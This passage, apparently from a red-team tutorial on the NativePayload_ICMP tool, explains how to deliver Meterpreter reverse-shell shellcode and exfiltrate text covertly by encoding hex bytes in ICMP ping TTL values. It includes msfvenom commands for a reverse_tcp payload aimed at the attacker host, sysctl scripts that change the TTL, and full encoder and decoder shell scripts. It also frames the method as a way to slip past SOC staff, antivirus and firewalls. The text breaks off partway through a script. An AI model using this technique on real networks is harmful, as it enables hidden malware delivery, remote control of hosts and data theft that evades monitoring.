do\n\r\n\rthis without Payload Encryption in File-system or Payload Encryption in Network Traffic so in this case\n\r\n\rPayload Transferred by ICMPv4 traffic and Executed in Memory Directly.\n\r\n\r \n\r\n\rWhat is important about this technique ?\n\r\n\rAn important point in this technique is using ICMP traffic without a big change in packets by Ping\n\r\n\rRequest and Ping Response so this traffic is normal and I don\'t think this method will be detected by\n\r\n\rSOC guys easily also AVs or probably Firewalls. maybe I\'m wrong so you can test it on your Network. \n\r\n\r \n\r\n\rUnderstanding this method : “Transfer or Download” Payload by ICMPv4 Traffic via TTL values\n\r\n\rFor example, we have two systems, first System A (Infected Windows system) and second System B (Linux).\n\r\n\rLinux IP address:192.168.1.50., Windows IP address:192.168.1.101.\n\r\n\rDump payloads by ICMP traffic and “TTL” step by step:\n\r\n\r• step 0: Backdoor or Malware executed (infected system)\n\r\n\r• step 1: Infected system tries to send ICMPv4 traffic to attacker’s system by ping command\n\r\n\r• step 2: Attacker system Received Ping Request and Send Response with Injected Payload in TTL values\n\r\n\r• step 3: Infected system dump TTL value from Ping Response (Payload transferred)\n\r\n\r \n\r\n\rHow much Ping Traffic do you need for “Transfer or Download” payloads?\n\r\n\rIf you have Meterpreter payload with 510 bytes, with this method after 1020 request / response at least ,\n\r\n\ryou can dump all payloads from the Linux system to the Windows system by ICMPv4 traffic very slowly\n\r\n\rand quietly. Now let me show you more detail about this method \n\r\n\r \n\r\n\rFor example, we have this payload = “fc4883c4f0”. to transfer “fc48” payload by Ping Request and Response, we have something like these steps:\n\r\n\rStep 1:\n\r\n\r● step1-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\r● step1-2: infected system &lt;== Ping Response with Injected Payload to TTL value “f” &lt;== Linux system\n\r\n\r● note: TTL “f” = 115, so ping response was with TTL 115\n\r\n\r \n\r\n\rStep 2:\n\r\n\r● step2-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\r● step2-2: infected system &lt;== Ping Response with Injected Payload to TTL value “c” &lt;== Linux system\n\r\n\r● note: TTL “c” = 112, so ping response was with TTL 112\n\r\n\r \n\r\n\rStep 3:\n\r\n\r● step3-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\r● step3-2: infected system &lt;== Ping Response with Injected Payload to TTL value “4” &lt;== Linux system\n\r\n\r● note: TTL “4” = 104, so ping response was with TTL 104\n\r\n\r \n\r\n\rStep 4:\n\r\n\r● step4-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\r● step4-2: infected system &lt;== Ping Response with Injected Payload to TTL value “8” &lt;== Linux system\n\r\n\r● note: TTL “8” = 108, so ping response was with TTL 108\n\r\n\r \n\r\n\rAfter four steps, we have these bytes of payload “fc48”. \n\r\n\rTTL values and payload values Description:\n\r\n\r \n\r\n\rTTL 100 = “0” , TTL 101 = “1” , TTL 102 = “2” ,TTL 103 = “3” ,TTL 104 = “4” , TTL 105 = “5”\n\r\n\rTTL 106 = “6” , TTL 107 = “7” , TTL 108 = “8” ,TTL 109 = “9” ,TTL 110 = “a” , TTL 111 = “b”\n\r\n\rTTL 112 = “c” , TTL 113 = “d” , TTL 114 = “e” ,TTL 115 = “f” \n\r\n\r \n\r\n\ror\n\r\n\r \n\r\n\rTTL 200 = “0” , TTL 201 = “1” , TTL 202 = “2” ,TTL 203 = “3” ,TTL 204 = “4” , TTL 205 = “5”\n\r\n\rTTL 206 = “6” , TTL 207 = “7” , TTL 208 = “8” ,TTL 209 = “9” ,TTL 210 = “a” , TTL 211 = “b”\n\r\n\rTTL 212 = “c” , TTL 213 = “d” , TTL 214 = “e” ,TTL 215 = “f”\n\r\n\r \n\r\n\rNote: TTL 255 = Flag for next payload, TTL 254 = Flag for Start (ICMP Traffic) \n\r\n\r \n\r\n\rHow can we change TTL for Ping Response on the attacker’s Side?\n\r\n\rThe answer is very simple, an attacker can do this by sysctl command very simply every time.\n\r\n\r \n\r\n\rExample: sudo sysctl net.ipv4.ip_default_ttl=115\n\r\n\rDescription: change default TTL for Linux system to 115\n\r\n\r \n\r\n\rNow you can understand how to do this, so to do these steps, we have something like these\n\r\n\rcommands, step by step.\n\r\n\rStep 1: \n\r\n\r● step1-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system c:\\&gt; ping 192.168.1.50 -n 1\n\r\n\r● step1-2: infected system &lt;== Ping Response with Injected Payload to TTL value “f” &lt;== Linux system \n\r\n\r \n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=254\n\r\n\rsleep 2\n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=115\n\r\n\rsleep 1\n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=255\n\r\n\rsleep 1\n\r\n\r \n\r\n\r● step1-3: infected system (Malware Dumping “f” by ICMP Response)\n\r\n\r \n\r\n\rStep 2:\n\r\n\r● step2-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\rc:\\&gt; ping 192.168.1.50 -n 1\n\r\n\r● step2-2: infected system &lt;== Ping Response with Injected Payload to TTL value “c” &lt;== Linux system\n\r\n\r \n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=112\n\r\n\rsleep 1\n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=255\n\r\n\rsleep 1\n\r\n\r \n\r\n\r● step2-3: infected system (Malware Dumping “c” by ICMP Response)\n\r\n\r \n\r\n\rStep 3:\n\r\n\r● step3-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system\n\r\n\rc:\\&gt; ping 192.168.1.50 -n 1\n\r\n\r● step3-2: infected system &lt;== Ping Response with Injected Payload to TTL value “4” &lt;== Linux system\n\r\n\r \n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=104\n\r\n\rsleep 1\n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=255\n\r\n\rsleep 1\n\r\n\r \n\r\n\r● step3-3: infected system (Malware Dumping “4” by ICMP Response)\n\r\n\r \n\r\n\rStep 4:\n\r\n\r● step4-1: infected system tries to ping 192.168.1.50 ==&gt; Linux system \n\r\n\rc:\\&gt; ping 192.168.1.50 -n 1\n\r\n\r● step4-2: infected system &lt;== Ping Response with Injected Payload to TTL value “8” &lt;== Linux system\n\r\n\r \n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=108\n\r\n\rsleep 1\n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=255\n\r\n\rsleep 1\n\r\n\r \n\r\n\r● step4-3: infected system (Malware Dumping “8” by ICMP Response)\n\r\n\r \n\r\n\rNow I can show you this technique on my tool: NativePayload_ICMP.exe and the result for my code,\n\r\n\rstep by step to do this attack and transfer payloads by ICMPv4 Traffic, in this case by TTL value.\n\r\n\r \n\r\n\rUsing NativePayload_ICMP tool step by step: \n\r\n\rStep 1: in this step you should make one payload, for example, a Meterpreter payload, so to do this\n\r\n\ryou can use msfvenom, for example: \n\r\n\r \n\r\n\rmsfvenom –arch x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.50 -f c &gt; payload.txt\n\r\n\r \n\r\n\ror\n\r\n\r \n\r\n\rmsfvenom –arch x86_64 –platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c &gt; payload.txt\n\r\n\r \n\r\n\rNow, for make bash script file with sysctl command you can use NativePayload_ICMP tool by Null\n\r\n\rswitch like “Picture 1” .\n\r\n\r \n\r\n\rAs you can see in picture 1, we have a payload without “\\0x” sections so you should use payload with this format. Something like this : “0xfc0x480x830xe4” ==&gt; “fc4883e4”. \n\r\n\r \n\r\n\rAfter step 1 we have something like “Picture 2” In this step, you should add #!/bin/bash manually in the first line of the script file, as you can see in “Picture 2”. So on the Linux side, you should have something like “Picture 3” \n\r\n\rPicture 1:\n\r\n\r \n\r\n\r Picture 2:  \n\r\n\rPicture 3:\n\r\n\r  \n\r\n\rPicture 4:\n\r\n\r \n\r\n\rAfter these steps you will have something like “Picture 5” but this Picture was for Version 1.0 of this tool :\n\r\n\r \n\r\n\rNativePayload_ICMP v1.0 Syntax :\n\r\n\rSyntax: NativePayload_ICMP.exe ipaddress (Linux system ip-address)\n\r\n\rExample: NativePayload_ICMP.exe 192.168.1.50\n\r\n\r \n\r\n\rNativePayload_ICMP v1.0 C# Source Code: https://github.com/DamonMohammadbagher/NativePayload_ICMP\n\r\n\r \n\r\n\rIn this case, 192.168.1.50 is the IP address for the Linux system (attacker system). And this IP address is\n\r\n\rMeterpreter listener, too. Finally, after 30 minutes with NativePayload_ICMP tool by ICMP Traffic (ping),\n\r\n\ryou will have Meterpreter Session like picture 5.\n\r\n\r Picture 5: \n\r\n\r\n\r\n\r \n\r\n\rNew Feature and syntax with NativePayload_ICMP.exe v2.0\n\r\n\rwith version 2.0 you can have “Shell Script” for “Exfiltration / Infiltration” . It means you can Send Data like “Text” or “Meterpreter Payload” via TTL values and ICMPv4 Traffic.\n\r\n\r \n\r\n\rAs you can see in “Picture 6” with Switch “shtext” you can Make simple Shell Script for Send DATA via “TTL” values.\n\r\n\r Picture 6: \n\r\n\rSend DATA as “Text” by “NativePayload_ICMP v2.0” (PART1) step by step :\n\r\n\r \n\r\n\rwith this version you can send DATA as Text via TTL values by ICMPv4 Traffic and these are your steps :\n\r\n\r \n\r\n\r\n\rstep 1 (Windows side): NativePayload_ICMP.exe shtext “your text ….”  \n\r\n\r\n\rstep 2-1 (Windows side): NativePayload_ICMP.exe listen 192.168.56.1  \n\r\n\r\n\rstep 2-2 (Linux side): ./script.sh \n\r\n\r\n\r \n\r\n\rstep1: this text will save to “script.sh” file and you can use this file on Linux side (step 2-2).\n\r\n\r \n\r\n\rso syntax for Switch “shtext” for “Step1” is :\n\r\n\r \n\r\n\rNativePayload_ICMP.exe  shtext  “Your ASCII Text”\n\r\n\r \n\r\n\rstep2:  in this step you should use switch “listen” with this Syntax your Code will Send Ping Request to Target system “Linux system” for Dump TTL values via Ping Responses. \n\r\n\r \n\r\n\rso syntax for Switch “listen” for “Step2” is :\n\r\n\r \n\r\n\r\n\r•NativePayload_ICMP.exe  listen  “w.x.y.z , IPv4 Address for Linux system” \n\r\n\r\n\r \n\r\n\rthis is your script Code for change TTL values and you can change this “sleep 3” value to “2” or “1”  for execute Code with better Performance . (Recommended : sleep 2)\n\r\n\r \n\r\n\rsudo sysctl net.ipv4.ip_default_ttl=$str; sleep 3;\n\r\n\r \n\r\n\rnote : Step 2-1 and Step 2-2 should be at same time , as you can see in “Picture 7” and “Picture 8” this is your output : \n\r\n\rPicture 7:\n\r\n\r \n\r\n\r Picture 8: \n\r\n\r\n\r\n\r \n\r\n\rSend DATA as “Meterpreter Payload” by “NativePayload_ICMP.exe v2.0” step by step:\n\r\n\r \n\r\n\rwith this C# version 2.0 also previous version 1.0 you can send DATA as “Meterpreter Payload” via TTL values by ICMPv4 Traffic and these are your steps :\n\r\n\r \n\r\n\r\n\rstep 1 : msfvenom –arch x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 -f c &gt; payload.txt \n\r\n\r\n\rstep 2 (Windows side): NativePayload_ICMP.exe sh “fce88200....”  \n\r\n\r\n\rstep 3-1 (Windows side): NativePayload_ICMP.exe session 192.168.56.1  \n\r\n\r\n\rstep 3-2 (Linux side): ./script.sh \n\r\n\r\n\rNote : in step 2 you should change your Payload created in “Step1” from this format “\\xfc\\xe8...” to this “fce8...” \n\r\n\r\n\rNote : with (Step2) you will have “script.sh” File and Meterpreter Payload injected to TTL values via this step.\n\r\n\r Picture 9: \n\r\n\rSend DATA as “Text” by “NativePayload_ICMP v2.0” (PART2) step by step :\n\r\n\rin this “Part 2” I want to talk about Linux systems only also I want to talk about “NativePayload_ICMP.sh“ Script file.\n\r\n\rI am not Professional Shell Script Programmer but I want to talk about how can do this by Simple Shell Script on Linux Side so I made one simple Script to Dump DATA or “Text” behind each “TTL”.\n\r\n\rI made two versions of this Shell script and first in this “Part 2” I want to talk about first version (old version) and I will talk about Second Version via “Part 3” in this article.\n\r\n\r \n\r\n\rSyntax :\n\r\n\rNativePayload_ICMP.sh “w.x.y.z”\n\r\n\rNativePayload_ICMP.sh 192.168.1.101\n\r\n\r \n\r\n\rNativePayload_ICMP.sh (old version)\n\r\n\r  #!/bin/sh \n\r\n\rpayload=\"\";\n\r\n\rPingRequest=0;\n\r\n\rc=0;\n\r\n\rtemp=\"\";\n\r\n\rwhile (true)\n\r\n\rdo\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r        ((PingRequest++));\n\r\n\r \n\r\n\r        string=`ping $1 -c 1 | grep -e ttl= | awk {\'print $6\'}`  \n\r\n\r        echo\n\r\n\r        string=`echo $string | cut -d\'=\' -f2`    \n\r\n\r   \n\r\n\r        case $string in \n\r\n\r        100)\n\r\n\r tput setaf 2; \n\r\n\r        echo \"[$Time]\" \"Dumped Byte via TTL : 0\"\n\r\n\r        if (( $temp != 100 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"0\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        101)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 1\"\n\r\n\r        if (( $temp != 101 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"1\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        102)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 2\"\n\r\n\r        if (( $temp != 102 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"2\"\n\r\n\r        fi      \n\r\n\r        ;;\n\r\n\r        103)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 3\"\n\r\n\r        if (( $temp != 103 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"3\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        104)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 4\"\n\r\n\r        if (( $temp != 104 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"4\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        105)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 5\"\n\r\n\r        if (( $temp != 105 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"5\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        106)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 6\"\n\r\n\r        if (( $temp != 106 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"6\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        107)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 7\"\n\r\n\r        if (( $temp != 107 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"7\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        108)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 8\"\n\r\n\r        if (( $temp != 108 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"8\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        109)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 9\"\n\r\n\r        if (( $temp != 109 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"9\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        110)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : a\"\n\r\n\r        if (( $temp != 110 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"a\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        111)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : b\"\n\r\n\r        if (( $temp != 111 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"b\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        112)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : c\"\n\r\n\r        if (( $temp != 112 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"c\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        113)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : d\"\n\r\n\r        if (( $temp != 113 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"d\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        114)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : e\"\n\r\n\r        if (( $temp != 114 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"e\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        115)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : f\"\n\r\n\r        if (( $temp != 115 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"f\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        255)\n\r\n\r        tput setaf 1; \n\r\n\r        echo \"[$Time] ,\" $c \":Dumped Finish Flag \'ttl 255\' \"        \n\r\n\r \n\r\n\r        ((c++));\n\r\n\r \n\r\n\r        if (( $c == 25 )) ;\n\r\n\r        then\n\r\n\r        break\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        esac\n\r\n\r        \n\r\n\r        temp=$string;\n\r\n\r \n\r\n\r tput setaf 9;\n\r\n\r       echo \"Ping Requests:\" $PingRequest \n\r\n\r       echo \"your Payload :\"  $payload \n\r\n\r tput setaf 9; \n\r\n\r       final=`echo $payload | xxd -r -p`\n\r\n\r       echo \"your Data : \" $final\n\r\n\rsleep 1;\n\r\n\rdone\n\r\n\r \n\r\n\rwith this NativePayload_ICMP.sh script you need “script.sh” file too so for this section you need Csharp code to create this Script.sh file , by the way with this Shell Script you can have something like  “Picture 8” with “NativePaylad_ICMP.exe” plus switch “listen” but in this case you can do this Method on Linux system only .\n\r\n\rIt means you can have something like these steps :\n\r\n\r \n\r\n\rSyntax :\n\r\n\rNativePayload_ICMP.sh “w.x.y.z”\n\r\n\rNativePayload_ICMP.sh 192.168.1.101\n\r\n\r \n\r\n\r\"w.x.y.z\" is TargetIPv4 to Listening , it means your system will send Ping request to This IPv4 “w.z.y.z” for Listen to TTL values from Ping Response. you can use this Script with \"Script.sh\" file and this file should Created by NativePayload_ICMP.exe command via this syntax :\n\r\n\rNote: Sleep time in your \"script.sh\" source should be \"2\" or \"3\" always , Recommended : sleep 2;\n\r\n\r \n\r\n\rSyntax : NativePayload_ICMP.exe shtext \"your text or string\"\n\r\n\r \n\r\n\rafter this step you will have “script.sh” file then you can use this on \"Client side\" . now you can use (NativePayload_ICMP.sh  \"w.x.y.z\" ) on \"Server side\"  to send Ping Request to \"Client Side\":\n\r\n\r \n\r\n\rstep 0 (windows side) : NativePayload_ICMP.exe  shtext  \"your text or String\"\n\r\n\r \n\r\n\rNote: with \"step0\" you will have new Script File with name \"Script.sh\" .\n\r\n\r \n\r\n\rstep 1 (client side , linux system A) with IPv4 (192.168.56.1) : ./script.sh\n\r\n\r \n\r\n\rstep 2 (server side , linux system B) : ./NativePayload_ICMP.sh  \"192.168.56.1\"\n\r\n\r \n\r\n\rNote: \"Step 2\" should run after \"Step 1\" immediately after \"2 or 3\" seconds\n\r\n\r \n\r\n\rUsing NativePayload_ICMP.sh and ”Pictures” , step by step :\n\r\n\r \n\r\n\rin this step you should create your “script.sh” file \n\r\n\rstep 0 (windows side) : NativePayload_ICMP.exe  shtext  \"your text or String\"\n\r\n\r Picture 10: \n\r\n\rStep 1 and Step 2 with “Pictures 11 , 12 and 13”:\n\r\n\ras you can see in the “Picture 11” we have one Linux system with IPv4 address ”192.168.56.1” , in this case I used one system for test , so you can do this via 2 systems but in this time “step1 and step2” both executed on single system as you can see in the Picture “11” also “12 and 13”. \n\r\n\r \n\r\n\rit means “script.sh” for “Client side” executed on system “192.168.56.1” also “NativePayload_ICMP.sh” for “server side” executed on system “192.168.56.1”. as you can see I used NativePayload_ICMP.exe with switch “listen” for Compare output between these two Code one of them executed on Windows system with this syntax “c:\\&gt;NativePayload_ICMP.exe listen 192.168.56.1” and another one executed on linux system with this syntax “./NativePayload_ICMP.sh 192.168.56.1”.\n\r\n\r  \n\r\n\rPicture 11:\n\r\n\r Picture 12:  \n\r\n\rPicture 13: All Payload Dumped.\n\r\n\r \n\r\n\rAs you can see in the “Pictures 14 and 15” , I tested these scripts via two Linux systems with IPv4 192.168.56.1 and 192.168.56.101\n\r\n\r Picture 14: ping between ipv4 192.168.56.1 and 192.168.56.101 \n\r\n\rPicture 15: All Payload Dumped between two system via “128” Ping Request and Response. \n\r\n\rSend DATA as “Text” by “NativePayload_ICMP v2.0” (PART3) step by step :\n\r\n\rin this “Part 3” I want to talk about Linux systems only also I want to talk about “NativePayload_ICMP.sh“ (New version v 1.0) Script file. I want to talk about how can do this by Simple Shell Script on Linux Side so I made one simple Script to Dump DATA or “Text” behind each “TTL”.\n\r\n\r \n\r\n\rI made two versions of this Shell script and I talked about (old version) in “Part 2” now I want to talk about (New version).\n\r\n\rIn this version , you can have Both Switch “listen” and “shtext” with single script so in this case you do not Need to use NativePayload_ICMP.exe and Windows to do this method , It means you can use this script between two Linux systems without using “C#” Code for create “Script.sh” file .\n\r\n\r \n\r\n\rSo your steps will be something like these steps:\n\r\n\r \n\r\n\rUsing this Method via two Linux systems (Linux only) “Picture 16”\n\r\n\r \n\r\n\rstep1 (Linux system A with IPv4 192.168.1.10) :   ./NativePayload_ICMP.sh  shtext  ”your text”\n\r\n\rstep2 (Linux system B with IPv4 192.168.1.13) :   ./NativePayload_ICMP.sh  listen  192.168.1.10\n\r\n\r \n\r\n\rUsing this Method via one Linux system and one Windows system .\n\r\n\r \n\r\n\rstep1 (Linux system A with IPv4 192.168.1.10)       :   ./NativePayload_ICMP.sh  shtext  ”your text”\n\r\n\rstep2 (windows system B with IPv4 192.168.1.13) :   ./NativePayload_ICMP.exe  listen  192.168.1.10\n\r\n\r \n\r\n\rand you can see this method between two linux systems by “Picture 16” also you see this method between one windows system and one Linux system by “Picture 17”.\n\r\n\r \n\r\n\r  \n\r\n\rPicture 16:  NativePayload_ICMP (New version) , Linux only.\n\r\n\r Picture 17:  NativePayload_ICMP (New version) , Windows and Linux. \n\r\n\rAlso you see in the “Picture 18” another example for this shell Script  “NativePayload_ICMP.sh” v1.0:\n\r\n\r \n\r\n\r \n\r\n\r  \n\r\n\rPicture 18:  NativePayload_ICMP.sh (New version) , Linux only.\n\r\n\r \n\r\n\rNativePayload_ICMP.cs v2.0 C# Source code :\n\r\n\rhttps://github.com/DamonMohammadbagher/NativePayload_ICMP/tree/master/EBOOK\n\r\n\r \n\r\n\rNativePayload_ICMP.sh (old version) Script Source code :\n\r\n\rhttps://github.com/DamonMohammadbagher/NativePayload_ICMP/tree/master/EBOOK/old_version\n\r\n\r \n\r\n\rNativePayload_ICMP.sh v1.0 (new version) Script Source code :\n\r\n\rhttps://github.com/DamonMohammadbagher/NativePayload_ICMP/tree/master/EBOOK\n\r\n\r \n\r\n\rAt a glance:\n\r\n\rAs you can see in these Chapters/Articles, you can transfer malware payloads without hardcoded payload in file-system or encrypted file-system also you can transfer Malware Payloads without encrypted network traffic by general traffic, like ICMPv4 or ARP and DNS (PTR , A , AAAA Records) and wireless traffic via (BSSID) so who exactly checked these traffics in the network? SOC or Cisco guys , perhaps they have something for detect this or ... i don\'t know , maybe Linux/Windows Admins? I think no one suspected to these General/Normal traffic in LAN/WAN for Monitoring and nowadays, advanced malware uses these traffic very simply and quietly, so we should think/re-think about defense against these threats.\n\r\n\r \n\r\n\rNativePayload_ICMP.sh (new version 1.0)\n\r\n\r #!/bin/sh \n\r\n\rpayload=\"\";\n\r\n\rPingRequest=0;\n\r\n\rc=1;\n\r\n\rtemp=\"\";\n\r\n\rtput setaf 7;\n\r\n\recho\n\r\n\recho \"NativePayload_ICMP.sh Download Payload by ICMPv4 Traffic via \'TTL\' \";\n\r\n\recho \"NativePayload_ICMP v1.0 , Published by Damon Mohammadbagher 2017-2018 \";\n\r\n\rtput setaf 9;\n\r\n\rif [ \"$1\" == $\'help\' ] ;\n\r\n\rthen\n\r\n\recho\n\r\n\recho \"step0 Client-Side with ipv4 w.x.y.z , syntax :./NativePayload_ICMP.sh shtext \\\"your text or string\\\"\";\n\r\n\recho \"step1 Server-Side with ipv4 w1.x1.y1.z1 syntax :./NativePayload_ICMP.sh listen \\\"w.x.y.z\\\"\";\n\r\n\recho \"Note: in step1 you should use Client-side system w.x.y.z IPv4Address\";\n\r\n\recho\n\r\n\rfi\n\r\n\r \n\r\n\rif [ \"$1\" == $\'shtext\' ] ;\n\r\n\r        then\n\r\n\r#textpayload=`echo $2$\'\\157\' | xxd -p`\n\r\n\rtextpayload=`echo -n $2 | od -A n -t x1`\n\r\n\rttlpayload=\"\";\n\r\n\rmytemp=\"\";\n\r\n\recho\n\r\n\recho \"[!] your payload Text:\" $2;\n\r\n\recho \"[!] your payload bytes:\" $textpayload;\n\r\n\r                for pay in `echo $textpayload | xxd -c 1`\n\r\n\r                do\n\r\n\r                case $pay in\n\r\n\r                0)\n\r\n\r                if [ \"$mytemp\" != $\'0\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"100\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                1)\n\r\n\r                if [ \"$mytemp\" != $\'1\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"101\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                2)\n\r\n\r                if [ \"$mytemp\" != $\'2\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"102\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                3)\n\r\n\r                if [ \"$mytemp\" != $\'3\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"103\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                4)\n\r\n\r                if [ \"$mytemp\" != $\'4\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"104\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                5)\n\r\n\r                if [ \"$mytemp\" != $\'5\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"105\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                6)\n\r\n\r                if [ \"$mytemp\" != $\'6\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"106\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                7)\n\r\n\r                if [ \"$mytemp\" != $\'7\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"107\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                8)\n\r\n\r                if [ \"$mytemp\" != $\'8\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"108\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                9)\n\r\n\r                if [ \"$mytemp\" != $\'9\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"109\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                a)\n\r\n\r                if [ \"$mytemp\" != $\'a\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"110\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                b)\n\r\n\r                if [ \"$mytemp\" != $\'b\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"111\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                c)\n\r\n\r                if [ \"$mytemp\" != $\'c\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"112\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                d)\n\r\n\r                if [ \"$mytemp\" != $\'d\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"113\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                e)\n\r\n\r                if [ \"$mytemp\" != $\'e\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"114\"\n\r\n\r                fi\n\r\n\r                ;; \n\r\n\r                f)\n\r\n\r                if [ \"$mytemp\" != $\'f\' ] ;\n\r\n\r                then\n\r\n\r                ttlpayload+=\"115\"\n\r\n\r                fi\n\r\n\r                ;;\n\r\n\r                esac \n\r\n\r                mytemp=$pay;\n\r\n\r                done\n\r\n\r#echo $ttlpayload;\n\r\n\rmytemp2=\"\";\n\r\n\rFinalttlpayload=\"\";\n\r\n\r        for pay2 in `echo $ttlpayload | xxd -g 0 -c 3 | awk {\'print $3\'}`\n\r\n\r        do\n\r\n\r                if [ \"$mytemp2\" == \"$pay2\" ]\n\r\n\r                then\n\r\n\r                Finalttlpayload+=\"253\"\"$pay2\";\n\r\n\r                fi\n\r\n\r                if [ \"$mytemp2\" != \"$pay2\" ]\n\r\n\r                then\n\r\n\r                Finalttlpayload+=$pay2;\n\r\n\r                fi\n\r\n\r        mytemp2=$pay2        \n\r\n\r        done        \n\r\n\r        echo \n\r\n\r \n\r\n\r        #echo \"your TTL payload:\" $Finalttlpayload \n\r\n\r#       Finalttlpayload=`echo \"${Finalttlpayload::-6}\"`;\n\r\n\r          mylength=`echo ${#Finalttlpayload}`\n\r\n\r        div=3;\n\r\n\r        length=$((mylength / div));\n\r\n\r        \n\r\n\r        echo \"[!] your TTL payload:\" $Finalttlpayload;        \n\r\n\r        tput setaf 3; \n\r\n\r        echo \"[!] at least you need (\"$length\") Times to change TTL value\";\n\r\n\r        echo \"[!] at least you need (\"$length \"* 2) Ping Request/Response\";\n\r\n\r        tput setaf 9; \n\r\n\r        echo 